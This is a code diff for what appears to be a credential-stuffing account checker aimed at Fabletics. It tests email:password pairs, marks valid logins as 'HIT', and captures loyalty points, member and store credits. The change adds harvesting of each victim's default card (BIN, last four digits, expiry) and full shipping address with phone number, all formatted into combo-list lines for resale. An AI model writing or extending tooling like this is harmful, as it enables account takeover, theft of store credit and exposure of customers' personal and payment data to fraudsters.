@@ -22,22 +22,20 @@ class CheckResult:
         if self.status != "HIT":
             return self.format_line()
 
-        parts = [
-            self.email,
-            self.password,
-            f"Name={self.data.get('name', 'N/A')}",
-            f"MemberCredits={self.data.get('member_credits', 0)}",
-            f"StoreCredit=${self.data.get('store_credit_balance', 0):.2f}",
-            f"MembershipStoreCredit=${self.data.get('membership_store_credit_balance', 0):.2f}",
-            f"MaxPrepaidCredits={self.data.get('max_prepaid_credits', 0)}",
-            f"Membership={self.data.get('membership_status', 'N/A')}",
-            f"MonthlyPrice=${self.data.get('membership_price', 0):.2f}",
-            f"NextBill={self.data.get('next_billing_date', 'N/A')}",
-            f"Period={self.data.get('billing_period', 'N/A')}",
-            f"Due={self.data.get('billing_due', False)}",
-            f"SkipAllowed={self.data.get('skip_allowed', False)}",
-        ]
-        return " | ".join(parts)
+        cc = self.data.get("cc") or "N/A"
+        address = self.data.get("address") or "N/A"
+        store_credit = self.data.get("store_credit_balance", 0)
+        if float(store_credit).is_integer():
+            store_credit = int(store_credit)
+
+        return (
+            f"{self.email}:{self.password} | "
+            f"Points = {self.data.get('points', 0)} | "
+            f"Member_Credits = {self.data.get('member_credits', 0)} | "
+            f"storeCreditBalance = {store_credit} | "
+            f"CC = [{cc}] | "
+            f"Address = [{address}]"
+        )
 
     def format_line(self) -> str:
         if self.status == "HIT":
@@ -52,39 +50,86 @@ def _first(mapping: dict[str, Any], *keys: str, default: Any = None) -> Any:
     return default
 
 
-def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
-    profile = client.get(
-        "/api/accounts/me/profile",
-        token,
-        params={"includeEmail": "true"},
-    )
-    membership = client.get("/api/accounts/me/membership", token)
-    period = client.get("/api/accounts/me/membership/period", token)
+def _pick_default(items: list[dict[str, Any]]) -> dict[str, Any] | None:
+    if not items:
+        return None
+    for item in items:
+        if item.get("isDefault"):
+            return item
+    return items[0]
 
-    first_name = _first(profile, "firstName", default=_first(login_customer, "firstName", default=""))
-    last_name = _first(profile, "lastName", default=_first(login_customer, "lastName", default=""))
-    name = f"{first_name} {last_name}".strip() or "Unknown"
+
+def _format_card(card: dict[str, Any]) -> str:
+    card_type = str(card.get("cardType") or "CARD").upper()
+    cc_bin = str(card.get("ccBin") or "")
+    last_four = str(card.get("lastFourDigits") or "").zfill(4)
+    exp_month = str(card.get("expMonth") or "").zfill(2)
+    exp_year = str(card.get("expYear") or "")
+    if len(exp_year) == 4:
+        exp_year = exp_year[-2:]
+
+    masked = f"{cc_bin}{'•' * 6}{last_four}" if cc_bin else f"••••••••••{last_four}"
+    return f"{card_type} - {masked} exp: {exp_month}/{exp_year}"
+
+
+def _format_address(address: dict[str, Any]) -> str:
+    first = str(address.get("firstName") or "").strip()
+    last = str(address.get("lastName") or "").strip()
+    name = f"{first} {last}".strip()
+    address1 = str(address.get("address1") or "")
+    address2 = str(address.get("address2") or "")
+    country = str(address.get("countryCode") or "")
+    city = str(address.get("city") or "")
+    state = str(address.get("state") or "")
+    phone = str(address.get("phone") or "")
+    zip_code = str(address.get("zip") or "")
+    return f"{name}, {address1}, {address2}, {country}, {city}, {state}, {phone}, {zip_code}"
+
+
+def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
+    loyalty = client.get("/api/accounts/me/loyalty/details", token)
+    membership = client.get("/api/accounts/me/membership", token)
+    addresses = client.get("/api/accounts/me/addresses", token)
+
+    payments: list[dict[str, Any]] = []
+    try:
+        payments = client.get("/api/accounts/me/payments", token) or []
+    except FableticsAPIError:
+        pass
+
+    if not isinstance(addresses, list):
+        addresses = []
+    if not isinstance(payments, list):
+        payments = []
+
+    default_address = _pick_default(addresses)
+    shipping_id = membership.get("shippingAddressId")
+    if shipping_id:
+        for address in addresses:
+            if address.get("id") == shipping_id:
+                default_address = address
+                break
+
+    default_card = _pick_default(payments)
+    payment_object_id = membership.get("paymentObjectId")
+    if payment_object_id:
+        for card in payments:
+            if card.get("creditCardId") == payment_object_id:
+                default_card = card
+                break
+
+    points = int(loyalty.get("balance") or 0)
+    member_credits = int(membership.get("availableTokenQuantity") or 0)
+    store_credit_balance = float(membership.get("storeCreditBalance") or 0)
 
     return {
-        "name": name,
-        "email": _first(profile, "email", default=_first(login_customer, "email", default="")),
-        "customer_id": _first(profile, "id", default=_first(login_customer, "id")),
-        "member_credits": int(membership.get("availableTokenQuantity") or 0),
-        "membership_credits": int(membership.get("membershipCredits") or 0),
-        "store_credit_balance": float(membership.get("storeCreditBalance") or 0),
-        "membership_store_credit_balance": float(membership.get("membershipStoreCreditBalance") or 0),
-        "max_prepaid_credits": int(membership.get("maxPrepaidCredits") or 0),
-        "membership_status": membership.get("statusLabel", "Unknown"),
-        "membership_price": float(membership.get("price") or 0),
-        "membership_type": membership.get("membershipTypeLabel") or membership.get("periodType"),
-        "next_billing_date": membership.get("dateNextScheduled"),
-        "billing_period": period.get("periodLabel"),
-        "billing_due": period.get("isDue", False),
-        "skip_allowed": period.get("skipAllowed", False),
-        "bill_me_now_allowed": period.get("billMeNowAllowed", False),
-        "membership_id": membership.get("membershipId"),
-        "payment_method": membership.get("paymentMethod"),
-        "in_free_trial": membership.get("inFreeTrial", False),
+        "points": points,
+        "member_credits": member_credits,
+        "store_credit_balance": store_credit_balance,
+        "cc": _format_card(default_card) if default_card else "N/A",
+        "address": _format_address(default_address) if default_address else "N/A",
+        "email": _first(login_customer, "email"),
+        "customer_id": _first(login_customer, "id"),
     }
 
 
